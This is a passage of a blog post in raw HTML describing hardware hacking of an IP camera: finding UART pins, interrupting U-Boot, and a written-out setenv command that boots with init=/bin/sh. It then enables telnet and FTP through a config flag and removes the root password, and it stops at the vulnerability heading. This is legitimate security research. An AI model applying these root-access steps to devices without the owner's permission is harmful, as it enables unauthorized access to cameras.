href="https://he.aliexpress.com/item/32637261853.html?src=google&amp;albch=shopping&amp;acnt=494-037-6276&amp;isdl=y&amp;slnk=&amp;plac=&amp;mtctp=&amp;albbt=Google_7_shopping&amp;aff_platform=google&amp;aff_short_key=UneMJZVf&amp;gclsrc=aw.ds&amp;albagn=888888&amp;ds_e_adid=&amp;ds_e_matchtype=&amp;ds_e_device=c&amp;ds_e_network=x&amp;ds_e_product_group_id=&amp;ds_e_product_id=he32637261853&amp;ds_e_product_merchant_id=109036335&amp;ds_e_product_country=IL&amp;ds_e_product_language=iw&amp;ds_e_product_channel=online&amp;ds_e_product_store_id=&amp;ds_url_v=2&amp;albcp=19373940215&amp;albag=&amp;isSmbAutoCall=false&amp;needSmbHouyi=false&amp;gad_source=1&amp;gclid=CjwKCAjw5qC2BhB8EiwAvqa41jCW91o1S3oln1wOX5cH0wcy7LEhZAZmVDj1zVu26cbwy8Zr0nsf_RoCxt0QAvD_BwE&amp;gatewayAdapt=glo2isr" rel="noopener ugc nofollow" target="_blank">USB to UART adapter </a>So we can connect the possible TX point to the RX on the adapter and see if we can view something. Since UART is asynchronous, we need also to guess the baud rate. There are many options and to my luck, they were using 115200, which is widely used and a classic baud rate. <br/>So now we connect it to our computer and use Minicom or Putty to see if we have data.</p><figure class="ne nf ng nh ni nw nt nu paragraph-image"><div class="nt nu oj"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*wt6iXp2IW2KVD8KpAAyFwQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*wt6iXp2IW2KVD8KpAAyFwQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*wt6iXp2IW2KVD8KpAAyFwQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*wt6iXp2IW2KVD8KpAAyFwQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*wt6iXp2IW2KVD8KpAAyFwQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*wt6iXp2IW2KVD8KpAAyFwQ.png 1100w, https://miro.medium.com/v2/resize:fit:1340/format:webp/1*wt6iXp2IW2KVD8KpAAyFwQ.png 1340w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 670px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*wt6iXp2IW2KVD8KpAAyFwQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*wt6iXp2IW2KVD8KpAAyFwQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*wt6iXp2IW2KVD8KpAAyFwQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*wt6iXp2IW2KVD8KpAAyFwQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*wt6iXp2IW2KVD8KpAAyFwQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*wt6iXp2IW2KVD8KpAAyFwQ.png 1100w, https://miro.medium.com/v2/resize:fit:1340/1*wt6iXp2IW2KVD8KpAAyFwQ.png 1340w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 670px"/><img alt="" class="bh lm ob c" width="670" height="677" loading="lazy" role="presentation"/></picture></div><figcaption class="oc ff od nt nu oe of bf b bg z du">We see output through our putty conected to the serial of the USB to UART adapter</figcaption></figure><p id="95d8" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">Now we also want to be able to write stuff to the UART so we will need to find the RX test point. basically the same, it can also be 0 volts on idle depending on other stuff that I don’t want to dig deeper into. We will take that test point which we think is the one, Connect a wire to the USB adapter’s RX, simply hold a man jumper wire onto the test point, and try to press some keystrokes, if you get the correct one, It’s soldering time.</p><figure class="ne nf ng nh ni nw nt nu paragraph-image"><div role="button" tabindex="0" class="nx ny fj nz bh oa"><div class="nt nu ok"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*6yG9fvqagjY7pdfXWLdWmg.jpeg 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*6yG9fvqagjY7pdfXWLdWmg.jpeg 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*6yG9fvqagjY7pdfXWLdWmg.jpeg 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*6yG9fvqagjY7pdfXWLdWmg.jpeg 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*6yG9fvqagjY7pdfXWLdWmg.jpeg 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*6yG9fvqagjY7pdfXWLdWmg.jpeg 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6yG9fvqagjY7pdfXWLdWmg.jpeg 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*6yG9fvqagjY7pdfXWLdWmg.jpeg 640w, https://miro.medium.com/v2/resize:fit:720/1*6yG9fvqagjY7pdfXWLdWmg.jpeg 720w, https://miro.medium.com/v2/resize:fit:750/1*6yG9fvqagjY7pdfXWLdWmg.jpeg 750w, https://miro.medium.com/v2/resize:fit:786/1*6yG9fvqagjY7pdfXWLdWmg.jpeg 786w, https://miro.medium.com/v2/resize:fit:828/1*6yG9fvqagjY7pdfXWLdWmg.jpeg 828w, https://miro.medium.com/v2/resize:fit:1100/1*6yG9fvqagjY7pdfXWLdWmg.jpeg 1100w, https://miro.medium.com/v2/resize:fit:1400/1*6yG9fvqagjY7pdfXWLdWmg.jpeg 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lm ob c" width="700" height="934" loading="lazy" role="presentation"/></picture></div></div><figcaption class="oc ff od nt nu oe of bf b bg z du">After soldering and connecting to USB to UART adapter</figcaption></figure><p id="08fa" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">After soldering now we have a bootloader that we can view logs addresses and more. But I don’t care about addresses this time, I want a root shell.</p><p id="e1db" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">Fortunately, the Uboot has a 1-second “<strong class="mh gv">bootdelay”</strong>, which lets us stop the Uboot before it starts the boot. If the “bootdelay” parameter was 0 seconds, we wouldn’t be able to stop the boot, and that could be much more annoying to use it.</p><figure class="ne nf ng nh ni nw nt nu paragraph-image"><div role="button" tabindex="0" class="nx ny fj nz bh oa"><div class="nt nu ol"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*maIOnw-YBdfq7KKJCdWipw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*maIOnw-YBdfq7KKJCdWipw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*maIOnw-YBdfq7KKJCdWipw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*maIOnw-YBdfq7KKJCdWipw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*maIOnw-YBdfq7KKJCdWipw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*maIOnw-YBdfq7KKJCdWipw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*maIOnw-YBdfq7KKJCdWipw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*maIOnw-YBdfq7KKJCdWipw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*maIOnw-YBdfq7KKJCdWipw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*maIOnw-YBdfq7KKJCdWipw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*maIOnw-YBdfq7KKJCdWipw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*maIOnw-YBdfq7KKJCdWipw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*maIOnw-YBdfq7KKJCdWipw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*maIOnw-YBdfq7KKJCdWipw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lm ob c" width="700" height="328" loading="lazy" role="presentation"/></picture></div></div><figcaption class="oc ff od nt nu oe of bf b bg z du">We can interrupt Uboot before it boots</figcaption></figure><p id="6676" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk"><strong class="mh gv">Getting a root shell + TELNET and FTP</strong></p><p id="fdf6" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">Now we kind of want to extract the firmware image to understand what is going on with the init flow of the camera. View if we can do something to get ourselves root, maybe there is a bad password on “/etc/shadow” we can try to bruteforce?<br/>After extracting the firmware with a <a class="af nd" href="https://trmm.net/SPI_flash/" rel="noopener ugc nofollow" target="_blank">clip </a>and a Raspberry Pie with the <a class="af nd" href="https://hacklido.com/blog/379-firmware-extraction-from-spi-flash" rel="noopener ugc nofollow" target="_blank">flashrom</a> program, we can look at its contents, from Uboot mtdparts command output we can understand that the main app is sitting on the last partition. so let’s look at that:</p><p id="beb9" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">Since the device is using busybox, and busybox init will read from /etc/inittab, we should look at that:</p><figure class="ne nf ng nh ni nw nt nu paragraph-image"><div role="button" tabindex="0" class="nx ny fj nz bh oa"><div class="nt nu om"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*mUOzmHYTvK9ek8xzU7Ktww.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*mUOzmHYTvK9ek8xzU7Ktww.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*mUOzmHYTvK9ek8xzU7Ktww.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*mUOzmHYTvK9ek8xzU7Ktww.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*mUOzmHYTvK9ek8xzU7Ktww.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*mUOzmHYTvK9ek8xzU7Ktww.png 1100w, https://miro.medium.com/v2/resize:fit:1324/format:webp/1*mUOzmHYTvK9ek8xzU7Ktww.png 1324w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 662px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*mUOzmHYTvK9ek8xzU7Ktww.png 640w, https://miro.medium.com/v2/resize:fit:720/1*mUOzmHYTvK9ek8xzU7Ktww.png 720w, https://miro.medium.com/v2/resize:fit:750/1*mUOzmHYTvK9ek8xzU7Ktww.png 750w, https://miro.medium.com/v2/resize:fit:786/1*mUOzmHYTvK9ek8xzU7Ktww.png 786w, https://miro.medium.com/v2/resize:fit:828/1*mUOzmHYTvK9ek8xzU7Ktww.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*mUOzmHYTvK9ek8xzU7Ktww.png 1100w, https://miro.medium.com/v2/resize:fit:1324/1*mUOzmHYTvK9ek8xzU7Ktww.png 1324w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 662px"/><img alt="" class="bh lm ob c" width="662" height="434" loading="lazy" role="presentation"/></picture></div></div><figcaption class="oc ff od nt nu oe of bf b bg z du">/etc/inittab contents</figcaption></figure><p id="0520" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">As we can see here it start rcS, which will call rc.local and some other scripts until it gets interesting: It calls a script called anyka_service.sh that will check for a configuration file called anyka_cfg.ini, if the variable debug_uart is set to 1, we have TELNET and FTP, how nice of them ❤</p><figure class="ne nf ng nh ni nw nt nu paragraph-image"><div role="button" tabindex="0" class="nx ny fj nz bh oa"><div class="nt nu on"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*BfVqeIa-Y8X5LFPE50zkdg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*BfVqeIa-Y8X5LFPE50zkdg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*BfVqeIa-Y8X5LFPE50zkdg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*BfVqeIa-Y8X5LFPE50zkdg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*BfVqeIa-Y8X5LFPE50zkdg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*BfVqeIa-Y8X5LFPE50zkdg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BfVqeIa-Y8X5LFPE50zkdg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*BfVqeIa-Y8X5LFPE50zkdg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*BfVqeIa-Y8X5LFPE50zkdg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*BfVqeIa-Y8X5LFPE50zkdg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*BfVqeIa-Y8X5LFPE50zkdg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*BfVqeIa-Y8X5LFPE50zkdg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*BfVqeIa-Y8X5LFPE50zkdg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*BfVqeIa-Y8X5LFPE50zkdg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lm ob c" width="700" height="354" loading="lazy" role="presentation"/></picture></div></div><figcaption class="oc ff od nt nu oe of bf b bg z du">A part of the anyka_script.sh</figcaption></figure><p id="823e" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">Eventually it will run the binary anyka_ipc which is doing pretty much everything else in the camera.</p><figure class="ne nf ng nh ni nw nt nu paragraph-image"><div class="nt nu oo"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*x4dLdouXQHrV3JawcGAs-Q.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*x4dLdouXQHrV3JawcGAs-Q.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*x4dLdouXQHrV3JawcGAs-Q.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*x4dLdouXQHrV3JawcGAs-Q.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*x4dLdouXQHrV3JawcGAs-Q.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*x4dLdouXQHrV3JawcGAs-Q.png 1100w, https://miro.medium.com/v2/resize:fit:654/format:webp/1*x4dLdouXQHrV3JawcGAs-Q.png 654w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 327px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*x4dLdouXQHrV3JawcGAs-Q.png 640w, https://miro.medium.com/v2/resize:fit:720/1*x4dLdouXQHrV3JawcGAs-Q.png 720w, https://miro.medium.com/v2/resize:fit:750/1*x4dLdouXQHrV3JawcGAs-Q.png 750w, https://miro.medium.com/v2/resize:fit:786/1*x4dLdouXQHrV3JawcGAs-Q.png 786w, https://miro.medium.com/v2/resize:fit:828/1*x4dLdouXQHrV3JawcGAs-Q.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*x4dLdouXQHrV3JawcGAs-Q.png 1100w, https://miro.medium.com/v2/resize:fit:654/1*x4dLdouXQHrV3JawcGAs-Q.png 654w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 327px"/><img alt="" class="bh lm ob c" width="327" height="107" loading="lazy" role="presentation"/></picture></div><figcaption class="oc ff od nt nu oe of bf b bg z du">A part of the anyka_cfg.ini</figcaption></figure><p id="45eb" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">So the only thing we need is to get the anyka_cfg.ini and change its debug_uart variable to 1, there are many ways to get that:</p><p id="6db1" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">First I tried bruteforcing root’s password so I could interact with the Uboot shell I have and change the flag there. I couldn’t bruteforce it, so I’ll do something else:</p><p id="681a" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">Since we can stop Uboot we can do a lot of fun stuff, one of them is simply to execute /bin/sh through Uboot, by setting the init parameter as /bin/sh</p><pre class="ne nf ng nh ni nj nk nl bp nm bb bk"><span id="7356" class="nn no gu nk b bg np nq l nr ns">setenv boot_normal env set bootargs console=ttySAK0,115200n8 root=/dev/mtdblock5 rootfstype=squashfs init=/bin/sh \$\{mtdparts\} \$\{mem\} \$\{memsize\}\; run read_kernel\; bootm \$\{loadaddr\} - \$\{fdtcontroladdr\}<br/><br/>run boot_normal</span></pre><p id="7b2c" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">Now we basically have a root shell, but it is missing many of the stuff that will happen on boot and we can run /sbin/init ourselves but we dont want that. We want to get ourselves TELNET and FTP.. The anyka_cfg.ini is on a filesystem on a partition which its name is CONFIG, simply mount that, change the flag, umount and restart. now we will have debug_uart set, or basically TELNET and FTP. But how will we connect to the telnet? we dont have a user yet, so we will also remove the ‘x’ from the /etc/passwd file which says that there is a password for the user in the /etc/shadow file so root won’t have a password. For that scenario that was enough:<br/>(Also created another user which is the same and named user)</p><figure class="ne nf ng nh ni nw nt nu paragraph-image"><div class="nt nu op"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*L6iy3B-xuH7VD7YIHDo0xA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*L6iy3B-xuH7VD7YIHDo0xA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*L6iy3B-xuH7VD7YIHDo0xA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*L6iy3B-xuH7VD7YIHDo0xA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*L6iy3B-xuH7VD7YIHDo0xA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*L6iy3B-xuH7VD7YIHDo0xA.png 1100w, https://miro.medium.com/v2/resize:fit:510/format:webp/1*L6iy3B-xuH7VD7YIHDo0xA.png 510w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 255px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*L6iy3B-xuH7VD7YIHDo0xA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*L6iy3B-xuH7VD7YIHDo0xA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*L6iy3B-xuH7VD7YIHDo0xA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*L6iy3B-xuH7VD7YIHDo0xA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*L6iy3B-xuH7VD7YIHDo0xA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*L6iy3B-xuH7VD7YIHDo0xA.png 1100w, https://miro.medium.com/v2/resize:fit:510/1*L6iy3B-xuH7VD7YIHDo0xA.png 510w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 255px"/><img alt="" class="bh lm ob c" width="255" height="52" loading="lazy" role="presentation"/></picture></div><figcaption class="oc ff od nt nu oe of bf b bg z du">The change to make root and user without a password</figcaption></figure><p id="d318" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">We have telnet :) Hurray</p><figure class="ne nf ng nh ni nw nt nu paragraph-image"><div class="nt nu oq"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*RtAlw8l2im6ZWypqi9fKNA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*RtAlw8l2im6ZWypqi9fKNA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*RtAlw8l2im6ZWypqi9fKNA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*RtAlw8l2im6ZWypqi9fKNA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*RtAlw8l2im6ZWypqi9fKNA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*RtAlw8l2im6ZWypqi9fKNA.png 1100w, https://miro.medium.com/v2/resize:fit:616/format:webp/1*RtAlw8l2im6ZWypqi9fKNA.png 616w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 308px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*RtAlw8l2im6ZWypqi9fKNA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*RtAlw8l2im6ZWypqi9fKNA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*RtAlw8l2im6ZWypqi9fKNA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*RtAlw8l2im6ZWypqi9fKNA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*RtAlw8l2im6ZWypqi9fKNA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*RtAlw8l2im6ZWypqi9fKNA.png 1100w, https://miro.medium.com/v2/resize:fit:616/1*RtAlw8l2im6ZWypqi9fKNA.png 616w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 308px"/><img alt="" class="bh lm ob c" width="308" height="35" loading="lazy" role="presentation"/></picture></div><figcaption class="oc ff od nt nu oe of bf b bg z du">Root Telnet</figcaption></figure><p id="f942" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">We have uploaded a gdbserver and tcpdump to the camera using the FTP that we have now. <br/>now we can debug the camera main binary, which is the anyka_ipc, After a good reverse engineering sessions, we have found the vulnerability:</p><h1 id="8445" class="or no gu bf os ot ou ov ow ox oy oz pa pb pc pd pe pf pg ph pi pj pk pl pm pn bk"><strong class="al">The Vulnerability</strong></h1><p 